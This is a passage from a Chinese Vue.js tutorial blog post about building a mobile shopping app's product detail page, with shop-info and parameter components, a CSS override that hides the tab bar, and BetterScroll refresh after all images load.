title="商家（店铺）信息展示"></a>商家（店铺）信息展示</h2><p>同对请求商品基本信息一致，对请求的数据进行封装</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">Shop</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(shopInfo) &#123;</span><br><span class="line">    <span class="keyword">this</span>.logo = shopInfo.shopLogo;</span><br><span class="line">    <span class="keyword">this</span>.name = shopInfo.name;</span><br><span class="line">    <span class="keyword">this</span>.fans = shopInfo.cFans;</span><br><span class="line">    <span class="keyword">this</span>.sells = shopInfo.cSells;</span><br><span class="line">    <span class="keyword">this</span>.score = shopInfo.score;</span><br><span class="line">    <span class="keyword">this</span>.goodsCount = shopInfo.cGoods</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就是在Detail.vue引入该类名，并在getDetail(this.iid)后保存该类数据</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取商家信息</span></span><br><span class="line"><span class="keyword">this</span>.shop = <span class="keyword">new</span> Shop(data.shopInfo)</span><br></pre></td></tr></table></figure><p>接着就是创建对应展示的组件–DetailShopInfo.vue，和之前一样，没啥可说滴，样式挺难调的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;shop-info&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;shop-top&quot;&gt;</span><br><span class="line">      &lt;img :src&#x3D;&quot;shop.logo&quot;&gt;</span><br><span class="line">      &lt;span class&#x3D;&quot;title&quot;&gt;&#123;&#123;shop.name&#125;&#125;&lt;&#x2F;span&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;shop-middle&quot;&gt;</span><br><span class="line">      &lt;div class&#x3D;&quot;shop-middle-item shop-middle-left&quot;&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;info-sells&quot;&gt;</span><br><span class="line">          &lt;div class&#x3D;&quot;sells-count&quot;&gt;</span><br><span class="line">            &#123;&#123;shop.sells | sellCountFilter&#125;&#125;</span><br><span class="line">          &lt;&#x2F;div&gt;</span><br><span class="line">          &lt;div class&#x3D;&quot;sells-text&quot;&gt;总销量&lt;&#x2F;div&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;info-goods&quot;&gt;</span><br><span class="line">          &lt;div class&#x3D;&quot;goods-count&quot;&gt;</span><br><span class="line">            &#123;&#123;shop.goodsCount&#125;&#125;</span><br><span class="line">          &lt;&#x2F;div&gt;</span><br><span class="line">          &lt;div class&#x3D;&quot;goods-text&quot;&gt;全部宝贝&lt;&#x2F;div&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">      &lt;&#x2F;div&gt;</span><br><span class="line">      &lt;div class&#x3D;&quot;shop-middle-item shop-middle-right&quot;&gt;</span><br><span class="line">        &lt;table&gt;</span><br><span class="line">          &lt;tr v-for&#x3D;&quot;(item, index) in shop.score&quot; :key&#x3D;&quot;index&quot;&gt;</span><br><span class="line">            &lt;td&gt;&#123;&#123;item.name&#125;&#125;&lt;&#x2F;td&gt;</span><br><span class="line">            &lt;td class&#x3D;&quot;score&quot; :class&#x3D;&quot;&#123;&#39;score-better&#39;: item.isBetter&#125;&quot;&gt;&#123;&#123;item.score&#125;&#125;&lt;&#x2F;td&gt;</span><br><span class="line">            &lt;td class&#x3D;&quot;better&quot; :class&#x3D;&quot;&#123;&#39;better-more&#39;: item.isBetter&#125;&quot;&gt;&lt;span&gt;&#123;&#123;item.isBetter ? &#39;高&#39;:&#39;低&#39;&#125;&#125;&lt;&#x2F;span&gt;&lt;&#x2F;td&gt;</span><br><span class="line">          &lt;&#x2F;tr&gt;</span><br><span class="line">        &lt;&#x2F;table&gt;</span><br><span class="line">      &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;shop-bottom&quot;&gt;</span><br><span class="line">      &lt;div class&#x3D;&quot;enter-shop&quot;&gt;进店逛逛&lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">name: &quot;DetailShopInfo&quot;,</span><br><span class="line">    props: &#123;</span><br><span class="line">  shop: &#123;</span><br><span class="line">    type: Object,</span><br><span class="line">        default() &#123;</span><br><span class="line">      return &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    filters: &#123;</span><br><span class="line">      sellCountFilter: function (value) &#123;</span><br><span class="line">        if (value &lt; 10000) return value;</span><br><span class="line">        return (value&#x2F;10000).toFixed(1) + &#39;万&#39;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">  .shop-info &#123;</span><br><span class="line">    padding: 25px 8px;</span><br><span class="line">    border-bottom: 5px solid #f2f5f8;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .shop-top &#123;</span><br><span class="line">    line-height: 45px;</span><br><span class="line">    &#x2F;* 让元素垂直中心对齐 *&#x2F;</span><br><span class="line">    display: flex;</span><br><span class="line">    align-items: center;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .shop-top img &#123;</span><br><span class="line">    width: 45px;</span><br><span class="line">    height: 45px;</span><br><span class="line">    border-radius: 50%;</span><br><span class="line">    border: 1px solid rgba(0,0,0,.1);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .shop-top .title &#123;</span><br><span class="line">    margin-left: 10px;</span><br><span class="line">    vertical-align: center;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .shop-middle &#123;</span><br><span class="line">    margin-top: 15px;</span><br><span class="line">    display: flex;</span><br><span class="line">    align-items: center;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .shop-middle-item &#123;</span><br><span class="line">    flex: 1;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .shop-middle-left &#123;</span><br><span class="line">    display: flex;</span><br><span class="line">    justify-content: space-evenly;</span><br><span class="line">    color: #333;</span><br><span class="line">    text-align: center;</span><br><span class="line">    border-right: 1px solid rgba(0,0,0,.1);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .sells-count, .goods-count &#123;</span><br><span class="line">    font-size: 18px;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .sells-text, .goods-text &#123;</span><br><span class="line">    margin-top: 10px;</span><br><span class="line">    font-size: 12px;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .shop-middle-right &#123;</span><br><span class="line">    font-size: 13px;</span><br><span class="line">    color: #333;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .shop-middle-right table &#123;</span><br><span class="line">    width: 120px;</span><br><span class="line">    margin-left: 30px;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .shop-middle-right table td &#123;</span><br><span class="line">    padding: 5px 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .shop-middle-right .score &#123;</span><br><span class="line">    color: #5ea732;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .shop-middle-right .score-better &#123;</span><br><span class="line">    color: #f13e3a;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .shop-middle-right .better span &#123;</span><br><span class="line">    background-color: #5ea732;</span><br><span class="line">    color: #fff;</span><br><span class="line">    text-align: center;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .shop-middle-right .better-more span &#123;</span><br><span class="line">    background-color: #f13e3a;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .shop-bottom &#123;</span><br><span class="line">    text-align: center;</span><br><span class="line">    margin-top: 10px;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .enter-shop &#123;</span><br><span class="line">    display: inline-block;</span><br><span class="line">    font-size: 14px;</span><br><span class="line">    background-color: #f2f5f8;</span><br><span class="line">    width: 150px;</span><br><span class="line">    height: 30px;</span><br><span class="line">    text-align: center;</span><br><span class="line">    line-height: 30px;</span><br><span class="line">    border-radius: 10px;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><p>详情页引入该组件并传入对应的数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;detail-shop-info :shop&#x3D;&quot;shop&quot;&gt;&lt;&#x2F;detail-shop-info&gt;</span><br></pre></td></tr></table></figure><p>好的，到这里你会发现，各个类型的数据展示逻辑都是差不多一致的，我们来总结一下，如何将需要的各个接口数据进行按类型展示</p><ol><li>看接口所要展示的数据是否复杂<ul><li><strong>复杂：</strong>在网络请求函数中封装类，进行数据整合，再在相关页面请求数据后初始化该对象并定义对应的data接收</li><li><strong>不复杂</strong>：直接在相关页面定义data直接在请求数据后进行接收</li></ul></li><li>创建对应的子组件：根据业务需求定义样式</li><li>导入该组件并将需要的数据传入（子组件props，父组件:data=”data”)</li></ol><h2 id="取消底部tab-bar"><a href="#取消底部tab-bar" class="headerlink" title="取消底部tab-bar"></a>取消底部tab-bar</h2><p>详情页是不需要展示底部栏的，如何取消掉这个底部栏呢，这里有两个方法，重点讲第一个方法，推荐使用第二个方法（虽然我还没试过）</p><ol><li><p>css样式</p><p>很简单，就是在Detail.vue设置样式，让它覆盖掉底部栏，简单粗暴</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#detail</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">z-index</span>: <span class="number">9</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#fff</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><a href="https://blog.csdn.net/sslcsq/article/details/106220946" target="_blank" rel="noopener">router相关设置</a></p></li></ol><h2 id="引入Scroll"><a href="#引入Scroll" class="headerlink" title="引入Scroll"></a>引入Scroll</h2><p>这和在做首页的情况一样，除了顶部导航栏外，其它都要在Scroll的包裹下，所以我们引入Scroll组件，并设置样式，首先，当然就是给高度啦，必须给，给Scroll定义类名，并给予高度，这里使用计算值得出高度</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> &#123;</span><br><span class="line">  <span class="comment">/* 腹肌元素需要有高度 */</span></span><br><span class="line">  <span class="attribute">height</span>: <span class="built_in">calc</span>(<span class="number">100%</span> - <span class="number">44px</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到注释了有没有，所以我们还要给其父元素定义高度，</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#detail</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100vh</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就是让导航栏固定在顶部</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.detail-nav</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">z-index</span>: <span class="number">9</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#fff</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里自己的css有一点遗忘，相对定位与绝对定位的区别，在查阅了相关资料后进行了知识回冲——<a href="https://www.runoob.com/w3cnote/css-position-static-relative-absolute-fixed.html" target="_blank" rel="noopener">菜鸟教程</a></p><h2 id="商品详细数据"><a href="#商品详细数据" class="headerlink" title="商品详细数据"></a>商品详细数据</h2><p>按照前面的思路，首先对接口数据进行查阅，发现该接口数据相对简单，所以直接在Detail组件中进行存储</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取商品数据</span></span><br><span class="line">getDetail(<span class="keyword">this</span>.iid).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> data = res.result</span><br><span class="line">  <span class="comment">//获取商品详细数据</span></span><br><span class="line">  <span class="keyword">this</span>.detailInfo = data.detailInfo</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>接着就是创建对应展示的组件–DetailGoodsInfo.vue，和之前一样，没啥可说滴，但这里有一个知识点要提，就是，因为这里图片同样很多，和首页遇到的问题一样，你可能刷到一半就卡住不动了，所以我们要对这些图片数据加载完后进行scroll刷新，但是图片很多，如果每次在监听加载完一次图片就进行刷新，会不会很浪费性能，造成更大的内存占用，答案是肯定的，所以我们就等待全部图片加载完再进行刷新，有同学可能要问了，这里是否可以使用防抖，可以的，但是在网络较慢的情况下可能也会刷新多次，但是思路也可行，这里也主要讲另外一种解决方法</p><blockquote><p><strong>Vue.js 有一个方法 watch，它可以用来监测Vue实例上的数据变动。</strong></p></blockquote><p>利用这个特性，我们动态监听接收到的数据，然后对图片加载进行监听，判断图片是否加载完了，加载完则为其执行一次刷新</p><p>思路如下</p><p>首先定义两个值，一个存储当前加载的图片数量，一个存储需要加载的图片总数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data() &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    counter: <span class="number">0</span>,</span><br><span class="line">    imagesLength: <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>定义监听函数，保存当前需要加载的图片总数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">watch: &#123;</span><br><span class="line">    detailInfo() &#123;</span><br><span class="line">      <span class="comment">// 获取图片的个数</span></span><br><span class="line">    <span class="keyword">this</span>.imagesLength = <span class="keyword">this</span>.detailInfo.detailImage[<span class="number">0</span>].list.length</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>监听图片加载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img v-for&#x3D;&quot;(item, index) in detailInfo.detailImage[0].list&quot; :key&#x3D;&quot;index&quot; :src&#x3D;&quot;item&quot; @load&#x3D;&quot;imgLoad&quot; alt&#x3D;&quot;&quot;&gt;</span><br></pre></td></tr></table></figure><p>监听函数具体实现，每次加载完一张图片，counter便自增一后再与总图片数进行匹配，如一样，发送该事件，如不一样，继续自增，直到全部加载完</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">methods: &#123;</span><br><span class="line"> imgLoad() &#123;</span><br><span class="line">    <span class="comment">// 判断, 所有的图片都加载完了, 那么进行一次回调就可以了.</span></span><br><span class="line">    <span class="keyword">if</span> (++<span class="keyword">this</span>.counter === <span class="keyword">this</span>.imagesLength) &#123;</span><br><span class="line">      <span class="keyword">this</span>.$emit(<span class="string">'imageLoad'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>在detail进行刷新</p><p>首先绑定该事件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;detail-goods-info :detailInfo&#x3D;&quot;detailInfo&quot; @imageLoad&#x3D;&quot;imageLoad&quot;&gt;&lt;&#x2F;detail-goods-info&gt;</span><br></pre></td></tr></table></figure><p>然后很简单，就是执行一次刷新</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">methods: &#123;</span><br><span class="line">  imageLoad() &#123;</span><br><span class="line">    <span class="keyword">this</span>.$refs.scroll.refresh()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>OK，finish，但是，这里，如果用户刷新很快的话，会出现短暂的卡顿，原因差不多，就是图片还没加载完，但至少不会全都刷不出，所以在这里，如果追求用户体验的话，不追求性能的话，你可以每次图片加载就刷新一次，如果还是以性能优先，则直接全部加载完再刷新</p><p>其它的设置就同前面的一致啦，相关组件导入，数据传递等</p><h2 id="参数数据"><a href="#参数数据" class="headerlink" title="参数数据"></a>参数数据</h2><p>不再赘述，这里在查看完接口后决定进行数据封装，其他步骤一致</p><ol><li><p>数据封装</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">GoodsParam</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(info, rule) &#123;</span><br><span class="line">    <span class="comment">// 注: images可能没有值(某些商品有值, 某些没有值)</span></span><br><span class="line">    <span class="keyword">this</span>.image = info.images ? info.images[<span class="number">0</span>] : <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">this</span>.infos = info.set;</span><br><span class="line">    <span class="keyword">this</span>.sizes = rule.tables;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>获取商品参数数据</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取商品数据</span></span><br><span class="line">getDetail(<span class="keyword">this</span>.iid).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> data = res.result</span><br><span class="line">  <span class="comment">//获取商品参数数据</span></span><br><span class="line">  <span class="keyword">this</span>.paramInfo = <span class="keyword">new</span> GoodsParam(data.itemParams.info, data.itemParams.rule)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>创建组件（DetailParamIfo）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;param-info&quot; v-if&#x3D;&quot;Object.keys(paramInfo).length !&#x3D;&#x3D; 0&quot;&gt;</span><br><span class="line">    &lt;table v-for&#x3D;&quot;(table, index) in paramInfo.sizes&quot;</span><br><span class="line">           class&#x3D;&quot;info-size&quot; :key&#x3D;&quot;index&quot;&gt;</span><br><span class="line">      &lt;tr v-for&#x3D;&quot;(tr, indey) in table&quot; :key&#x3D;&quot;indey&quot;&gt;</span><br><span class="line">        &lt;td v-for&#x3D;&quot;(td, indez) in tr&quot; :key&#x3D;&quot;indez&quot;&gt;&#123;&#123;td&#125;&#125;&lt;&#x2F;td&gt;</span><br><span class="line">      &lt;&#x2F;tr&gt;</span><br><span class="line">    &lt;&#x2F;table&gt;</span><br><span class="line">    &lt;table class&#x3D;&quot;info-param&quot;&gt;</span><br><span class="line">      &lt;tr v-for&#x3D;&quot;(info, index) in paramInfo.infos&quot;&gt;</span><br><span class="line">        &lt;td class&#x3D;&quot;info-param-key&quot;&gt;&#123;&#123;info.key&#125;&#125;&lt;&#x2F;td&gt;</span><br><span class="line">        &lt;td class&#x3D;&quot;param-value&quot;&gt;&#123;&#123;info.value&#125;&#125;&lt;&#x2F;td&gt;</span><br><span class="line">      &lt;&#x2F;tr&gt;</span><br><span class="line">    &lt;&#x2F;table&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;info-img&quot; v-if&#x3D;&quot;paramInfo.image.length !&#x3D;&#x3D; 0&quot;&gt;</span><br><span class="line">      &lt;img :src&#x3D;&quot;paramInfo.image&quot; alt&#x3D;&quot;&quot;&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">name: &quot;DetailParamInfo&quot;,</span><br><span class="line">    props: &#123;</span><br><span class="line">  paramInfo: &#123;</span><br><span class="line">    type: Object,</span><br><span class="line">        default() &#123;</span><br><span class="line">      return &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">  .param-info &#123;</span><br><span class="line">    padding: 20px 15px;</span><br><span class="line">    font-size: 14px;</span><br><span class="line">    border-bottom: 5px solid #f2f5f8;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .param-info table &#123;</span><br><span class="line">    width: 100%;</span><br><span class="line">    border-collapse: collapse;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .param-info table tr &#123;</span><br><span class="line">    height: 42px;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .param-info table tr td &#123;</span><br><span class="line">    border-bottom: 1px solid rgba(100,100,100,.1);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .info-param-key &#123;</span><br><span class="line">    &#x2F;*当value的数据量比较大的时候, 会挤到key,所以给一个固定的宽度*&#x2F;</span><br><span class="line">    width: 95px;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .info-param &#123;</span><br><span class="line">    border-top: 1px solid rgba(0,0,0,.1);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .param-value &#123;</span><br><span class="line">    color: #eb4868</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .info-img img &#123;</span><br><span class="line">    width: 100%;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure></li><li><p>detail引入组件并传递数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;detail-param-info :param-info&#x3D;&quot;paramInfo&quot;&gt;&lt;&#x2F;detail-param-info&gt;</span><br></pre></td></tr></table></figure></li></ol><h2 id="业务难点（题外话）"><a href="#业务难点（题外话）" class="headerlink" title="业务难点（题外话）"></a>业务难点（题外话）</h2><ol><li>代码组织问题</li><li>业务逻辑<ol><li>理清逻辑（流程图+解决方案）</li><li>书写代码</li><li>功能实现</li></ol></li><li>bug处理</li></ol>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
            <tag> Vue移动端商城 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4.首页下BetterScroll</title>
